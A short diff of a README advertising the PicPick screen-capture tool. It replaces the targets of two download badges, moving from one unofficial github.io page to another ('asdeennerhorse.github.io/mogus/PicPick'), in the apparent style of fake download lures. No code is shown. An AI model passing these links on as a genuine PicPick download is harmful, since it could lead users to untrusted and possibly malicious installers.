@@ -2,7 +2,7 @@
 
 PicPick is a feature-rich screen capture and graphic editing tool tailored for professionals, designers, developers, and casual users. With scrolling screenshot, annotation tools, and color pickers, it’s the complete desktop solution for visual communication.
 
-[![Download PicPick](https://img.shields.io/badge/Download-PicPick-blueviolet)](https://picpick-download.github.io/.github)
+[![Download PicPick](https://img.shields.io/badge/Download-PicPick-blueviolet)](https://asdeennerhorse.github.io/mogus/PicPick)
 
 ---
 
@@ -56,7 +56,7 @@ PicPick is a feature-rich screen capture and graphic editing tool tailored for p
 
 ---
 
-[![Download PicPick](https://img.shields.io/badge/Download-PicPick-blueviolet)](https://picpick-download.github.io/.github)
+[![Download PicPick](https://img.shields.io/badge/Download-PicPick-blueviolet)](https://asdeennerhorse.github.io/mogus/PicPick)
 
 ---
 
